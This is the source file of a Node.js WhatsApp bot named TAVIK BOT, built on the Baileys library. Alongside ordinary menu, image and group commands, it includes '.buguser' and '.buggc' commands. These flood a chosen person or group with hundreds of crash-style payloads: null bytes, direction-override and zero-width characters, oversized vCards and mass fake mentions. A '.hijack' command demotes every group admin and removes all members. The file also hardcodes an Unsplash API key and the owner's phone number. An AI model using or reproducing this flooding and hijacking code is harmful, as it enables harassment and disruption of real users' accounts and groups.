const { makeWASocket, useMultiFileAuthState, downloadMediaMessage } = require('@whiskeysockets/baileys')
const readline = require('readline')
const http = require('http')
const pino = require('pino')
const axios = require('axios')

const rl = readline.createInterface({ input: process.stdin, output: process.stdout })
const question = (text) => new Promise((resolve) => rl.question(text, resolve))

// ======= CONFIG =======
const OWNER_NUMBER = '2348145688688' // Your number
const OWNER = OWNER_NUMBER + '@s.whatsapp.net'
const OWNER_NAME = 'TAVIK(GODSWILL)'
const BOT_NAME = 'TAVIK BOT'
const BOT_VERSION = 'V1.0'
const UNSPLASH_KEY = 'lE3LTM9IWIahm1jhcw6_Gn8L2_6hnyzK-NBrg6urD5w' // 🔁 Regenerate this at unsplash.com/developers

let sudoUsers = []  // Stored in memory (resets on restart)
let floodActive = {}

// ======= UPTIME =======
const startTime = Date.now()
function getUptime() {
    const seconds = Math.floor((Date.now() - startTime) / 1000)
    const mins = Math.floor(seconds / 60)
    const secs = seconds % 60
    const hrs = Math.floor(mins / 60)
    const remainMins = mins % 60
    if (hrs > 0) return `${hrs} hours, ${remainMins} minutes, ${secs} seconds`
    if (mins > 0) return `${mins} minutes, ${secs} seconds`
    return `${secs} seconds`
}

// ======= MENU =======
function getMenu(username) {
    return `━━━━━( ${BOT_NAME} ${BOT_VERSION} )━━━━━
┏━━━━━━━━━━━━━─────────────╮
│ 👤 ᴜsᴇʀ     : ${username}
│ ⏳ ᴜᴘᴛɪᴍᴇ   : ${getUptime()}
│ 🔐 ᴍᴏᴅᴇ     : Public 🔓
│ ✍️ ᴏᴡɴᴇʀ    : ${OWNER_NAME}
╰──────────────────────────╯
Hi ${username} 👋

┌─〔 Owner Commands 〕
│▧.*owner*    │▧.*alive*
│▧.*ping*     │▧.*credits*
│▧.*addsudo*  │▧.*delsudo*
│▧.*sudolist* │▧.*sudo*
│▧.*buguser @number*
│▧.*buggc*
│▧.*stopflood*
│▧.*hijack*
└──────────────────────────

┌─〔 Group Commands 〕
│▧.*hidetag*  │▧.*tagall*
│▧.*kick*     │▧.*promote*
│▧.*demote*   │▧.*mute*
│▧.*unmute*   │▧.*gcinfo*
│▧.*kickall*  │▧.*add*
│▧.*resetlink*
└──────────────────────────

┌─〔 Image & AI 〕
│▧.*pint <search>*
│▧.*upscale* (reply to image)
│▧.*wiki <search>*
│▧.*weather <city>*
└──────────────────────────

┌─〔 Download Commands 〕
│▧.*tosticker* │▧.*save*
│▧.*tiktok*    │▧.*toimg*
│▧.*tomp3*     │▧.*tomp4*
│▧.*savestatus*
└──────────────────────────

┌─〔 Fun & Games 〕
│▧.*dice*  │▧.*coin*
│▧.*joke*  │▧.*8ball*
│▧.*truth* │▧.*dare*
│▧.*meme*  │▧.*funfact*
└──────────────────────────

┌─〔 Media & Tools 〕
│▧.*autoreply*
│▧.*antidelete*
│▧.*antibadword*
│▧.*autoread*
│▧.*autoreact*
└──────────────────────────

╔══════════════════════════╗
║   🤖 ${BOT_NAME} ${BOT_VERSION}       ║
║   👑 Owner: ${OWNER_NAME}   ║
║   ⚡ Powered by TAVIK TECH ║
║   🛡️ Built with ❤️ by      ║
║      GODSWILL (TAVIK)      ║
╚══════════════════════════╝`
}

// ======= SEARCH IMAGE =======
async function searchImage(query) {
    try {
        const res = await axios.get('https://api.unsplash.com/search/photos', {
            params: { query, per_page: 1 },
            headers: { Authorization: `Client-ID ${UNSPLASH_KEY}` }
        })
        const results = res.data.results
        if (!results || results.length === 0) return null
        return results[0].urls.regular
    } catch (e) {
        return `https://source.unsplash.com/800x600/?${encodeURIComponent(query)}`
    }
}

// ======= DOWNLOAD IMAGE =======
async function downloadImageBuffer(url) {
    try {
        const res = await axios.get(url, { responseType: 'arraybuffer', timeout: 15000 })
        return Buffer.from(res.data)
    } catch (e) { return null }
}

// ======= UPSCALE IMAGE =======
async function upscaleImage(imageBuffer) {
    try {
        const FormData = require('form-data')
        const form = new FormData()
        form.append('image', imageBuffer, { filename: 'image.jpg', contentType: 'image/jpeg' })

        const res = await axios.post('https://api.deepai.org/api/torch-srgan', form, {
            headers: { ...form.getHeaders(), 'api-key': 'quickstart-QUdJIGlzIGZ1bg' },
            timeout: 30000
        })

        const outputUrl = res.data?.output_url
        if (!outputUrl) return null
        return await downloadImageBuffer(outputUrl)
    } catch (e) { return null }
}

// ======= FLOOD =======
async function floodTarget(sock, jid, count = 200) {
    floodActive[jid] = true
    const payloads = [
        () => ({ text: '\u0000'.repeat(5000) + '꧔ꦿ'.repeat(2000) }),
        () => ({
            contacts: {
                displayName: '​'.repeat(3000),
                contacts: Array(150).fill({
                    vcard: `BEGIN:VCARD\nVERSION:3.0\nFN:${'​'.repeat(800)}\nTEL:+${'9'.repeat(300)}\nEND:VCARD`
                })
            }
        }),
        () => ({ text: '᷂᷿᷄᷾'.repeat(3000) + '\u202E'.repeat(2000) }),
        () => ({ text: '\u200B\u200C\u200D\uFEFF'.repeat(4000) }),
        () => ({ text: '𒐫'.repeat(4000) + '\u0000'.repeat(1000) }),
        () => ({ text: '@0000000000 '.repeat(500), mentions: Array(500).fill('0000000000@s.whatsapp.net') }),
        () => ({ text: '🔥💥⚡🌀'.repeat(3000) }),
        () => ({ text: '\u202E' + 'TAVIK'.repeat(2000) + '\u202C'.repeat(2000) })
    ]

    let sent = 0
    while (floodActive[jid] && sent < count) {
        try {
            await sock.sendMessage(jid, payloads[sent % payloads.length]())
            if (sent % 5 !== 0) await new Promise(r => setTimeout(r, 100))
            sent++
        } catch (e) {
            await new Promise(r => setTimeout(r, 200))
        }
    }
    floodActive[jid] = false
    return sent
}

function stopFlood(jid) { floodActive[jid] = false }

// ======= HIJACK =======
async function hijackGroup(sock, jid) {
    try {
        const meta = await sock.groupMetadata(jid)
        const botId = sock.user.id.split(':')[0] + '@s.whatsapp.net'
        const admins = meta.participants.filter(p => p.admin && p.id !== botId).map(p => p.id)
        const members = meta.participants.filter(p => p.id !== botId).map(p => p.id)

        try { await sock.groupParticipantsUpdate(jid, [botId], 'promote') } catch (e) {}
        if (admins.length > 0) await sock.groupParticipantsUpdate(jid, admins, 'demote').catch(() => {})

        const chunks = []
        for (let i = 0; i < members.length; i += 5) chunks.push(members.slice(i, i + 5))
        for (const chunk of chunks) {
            await sock.groupParticipantsUpdate(jid, chunk, 'remove').catch(() => {})
            await new Promise(r => setTimeout(r, 500))
        }

        await sock.sendMessage(jid, { text: `⚡ *${BOT_NAME}* has taken over!\n👑 Now owned by ${OWNER_NAME}` })
        return true
    } catch (e) { return false }
}

// ======= MAIN BOT =======
async function startBot() {
    const { state, saveCreds } = await useMultiFileAuthState('auth_info')

    const sock = makeWASocket({
        auth: state,
        printQRInTerminal: false,
        logger: pino({ level: 'silent' })
    })

    sock.ev.on('creds.update', saveCreds)

    if (!sock.authState.creds.registered) {
        const number = await question('Enter your WhatsApp number (e.g. 2348012345678): ')
        const code = await sock.requestPairingCode(number.trim())
        console.log(`\n🔑 Pairing Code: ${code}\n`)
        rl.close()
    }

    sock.ev.on('messages.upsert', async ({ messages }) => {
        try {
            const msg = messages[0]
            if (!msg.message) return

            const from = msg.key.remoteJid
            const sender = msg.key.participant || msg.key.remoteJid
            const senderNumber = sender.split('@')[0]
            const isOwner = sender === OWNER
            const isSudo = sudoUsers.includes(senderNumber)
            const isPrivileged = isOwner || isSudo
            const isGroup = from.endsWith('@g.us')

            const text = msg.message?.conversation ||
                         msg.message?.extendedTextMessage?.text || ''
            const args = text.trim().split(' ')
            const cmd = args[0].toLowerCase()
            const query = args.slice(1).join(' ')

            // ===== MENU =====
            if (cmd === '.menu') {
                await sock.sendMessage(from, { text: getMenu(msg.pushName || 'User') })
            }

            // ===== ALIVE =====
            if (cmd === '.alive') {
                await sock.sendMessage(from, {
                    text: `✅ *${BOT_NAME} is Alive!*\n⏳ Uptime: ${getUptime()}\n👑 Owner: ${OWNER_NAME}`
                })
            }

            // ===== PING =====
            if (cmd === '.ping') {
                const t = Date.now()
                await sock.sendMessage(from, { text: `🏓 Pong! ⚡ ${Date.now() - t}ms` })
            }

            // ===== CREDITS =====
            if (cmd === '.credits') {
                await sock.sendMessage(from, {
                    text: `╔══════════════════════╗\n║  🏆 TAVIK BOT CREDITS  ║\n╚══════════════════════╝\n\n👑 Developer: GODSWILL (TAVIK)\n🤖 Bot: ${BOT_NAME} ${BOT_VERSION}\n⚡ Engine: Baileys + Node.js\n🌍 Host: TAVIK TECH\n💎 Built with ❤️ by TAVIK(GODSWILL)`
                })
            }

            // ===== OWNER =====
            if (cmd === '.owner') {
                await sock.sendMessage(from, {
                    text: `👑 *BOT OWNER*\n\nName: ${OWNER_NAME}\nNumber: wa.me/${OWNER_NUMBER}\n⚡ TAVIK TECH`
                })
            }

            // ===== PINT =====
            if (cmd === '.pint') {
                if (!query) return sock.sendMessage(from, {
                    text: '❌ Usage: .pint <what you want>\nExamples:\n• .pint sunset beach\n• .pint anime girl\n• .pint sport car'
                })
                await sock.sendMessage(from, { text: `🔍 Searching for *${query}*...` })
                const imageUrl = await searchImage(query)
                if (!imageUrl) return sock.sendMessage(from, { text: '❌ No image found. Try different words!' })
                const imageBuffer = await downloadImageBuffer(imageUrl)
                if (!imageBuffer) return sock.sendMessage(from, { text: '❌ Failed to load image!' })
                await sock.sendMessage(from, {
                    image: imageBuffer,
                    caption: `🖼️ *Result:* ${query}\n⚡ ${BOT_NAME} | ${OWNER_NAME}`
                })
            }

            // ===== UPSCALE =====
            if (cmd === '.upscale') {
                const quoted = msg.message?.extendedTextMessage?.contextInfo?.quotedMessage
                const imageMsg = quoted?.imageMessage || msg.message?.imageMessage
                if (!imageMsg) return sock.sendMessage(from, {
                    text: '❌ How to use:\n1. Find any image\n2. Reply to it\n3. Type .upscale'
                })
                await sock.sendMessage(from, { text: '🔧 Enhancing image quality... Please wait ⏳' })
                try {
                    const buffer = await downloadMediaMessage(
                        { message: quoted ? { imageMessage: imageMsg } : msg.message, key: msg.key },
                        'buffer', {}
                    )
                    const upscaled = await upscaleImage(buffer)
                    if (!upscaled) return sock.sendMessage(from, { text: '❌ Enhancement failed! Try again.' })
                    await sock.sendMessage(from, {
                        image: upscaled,
                        caption: `✅ *Image Enhanced!*\n📈 Quality boosted 2x\n⚡ ${BOT_NAME} | ${OWNER_NAME}`
                    })
                } catch (e) {
                    await sock.sendMessage(from, { text: '❌ Error! Make sure you replied to an image.' })
                }
            }

            // ===== ADDSUDO (Owner adds sudo via WhatsApp) =====
            if (cmd === '.addsudo' && isOwner) {
                // Works by tagging: .addsudo @number OR replying to their message
                let target = args[1]?.replace(/[^0-9]/g, '')

                // If owner replied to someone's message
                const replyJid = msg.message?.extendedTextMessage?.contextInfo?.participant
                if (!target && replyJid) target = replyJid.split('@')[0]

                if (!target) return sock.sendMessage(from, {
                    text: '❌ Usage:\n• .addsudo 2348012345678\n• Or reply to their message with .addsudo'
                })
                if (sudoUsers.includes(target)) return sock.sendMessage(from, { text: `⚠️ ${target} is already sudo!` })
                sudoUsers.push(target)
                await sock.sendMessage(from, {
                    text: `✅ *${target}* is now a sudo user!\n⚡ They can now use privileged commands.`,
                    mentions: [target + '@s.whatsapp.net']
                })
            }

            // ===== DELSUDO =====
            if (cmd === '.delsudo' && isOwner) {
                let target = args[1]?.replace(/[^0-9]/g, '')
                const replyJid = msg.message?.extendedTextMessage?.contextInfo?.participant
                if (!target && replyJid) target = replyJid.split('@')[0]
                if (!target) return sock.sendMessage(from, { text: '❌ Usage: .delsudo 2348012345678' })
                sudoUsers = sudoUsers.filter(n => n !== target)
                await sock.sendMessage(from, { text: `✅ *${target}* removed from sudo!` })
            }

            // ===== SUDOLIST =====
            if (cmd === '.sudolist') {
                if (!sudoUsers.length) return sock.sendMessage(from, { text: '📋 No sudo users yet.' })
                await sock.sendMessage(from, {
                    text: `👥 *Sudo Users:*\n\n${sudoUsers.map((n, i) => `${i + 1}. wa.me/${n}`).join('\n')}`
                })
            }

            // ===== SUDO CHECK =====
            if (cmd === '.sudo') {
                if (!isPrivileged) return sock.sendMessage(from, {
                    text: '❌ You are not a sudo user!\nContact the owner to get sudo access.'
                })
                await sock.sendMessage(from, {
                    text: `✅ *Sudo Access Confirmed!*\n\n👤 User: ${msg.pushName}\n🔑 Level: ${isOwner ? 'Owner 👑' : 'Sudo ⚡'}\n⚡ ${BOT_NAME}`
                })
            }

            // ===== BUG USER =====
            if (cmd === '.buguser' && isPrivileged) {
                let target = args[1]?.replace(/[^0-9]/g, '')
                const replyJid = msg.message?.extendedTextMessage?.contextInfo?.participant
                if (!target && replyJid) target = replyJid.split('@')[0]
                if (!target) return sock.sendMessage(from, { text: '❌ Usage: .buguser 2348012345678 [count]\nOr reply to their message with .buguser' })
                const count = parseInt(args[2]) || 200
                await sock.sendMessage(from, { text: `🐛 Flooding ${target} with ${count} messages...` })
                const sent = await floodTarget(sock, target + '@s.whatsapp.net', count)
                await sock.sendMessage(from, { text: `✅ Sent ${sent} flood messages to ${target}` })
            }

            // ===== BUG GC =====
            if (cmd === '.buggc' && isPrivileged) {
                if (!isGroup) return sock.sendMessage(from, { text: '❌ Use in a group!' })
                const count = parseInt(args[1]) || 200
                await sock.sendMessage(from, { text: `🐛 Flooding group with ${count} messages...` })
                const sent = await floodTarget(sock, from, count)
                await sock.sendMessage(from, { text: `✅ Sent ${sent} flood messages!` })
            }

            // ===== STOP FLOOD =====
            if (cmd === '.stopflood' && isPrivileged) {
                const target = args[1]?.replace(/[^0-9]/g, '')
                stopFlood(target ? target + '@s.whatsapp.net' : from)
                await sock.sendMessage(from, { text: '🛑 Flood stopped!' })
            }

            // ===== HIJACK =====
            if (cmd === '.hijack' && isOwner) {
                if (!isGroup) return sock.sendMessage(from, { text: '❌ Use in a group!' })
                await sock.sendMessage(from, { text: '⚡ Hijacking...' })
                const result = await hijackGroup(sock, from)
                if (!result) await sock.sendMessage(from, { text: '❌ Failed! Add bot to group first.' })
            }

        } catch (err) {
            console.log('Error:', err)
        }
    })

    http.createServer((req, res) => res.end(`${BOT_NAME} Running! ⚡`)).listen(3000)
    console.log(`✅ ${BOT_NAME} ${BOT_VERSION} Started!`)
    console.log(`👑 Owner: ${OWNER_NAME}`)
}

startBot()
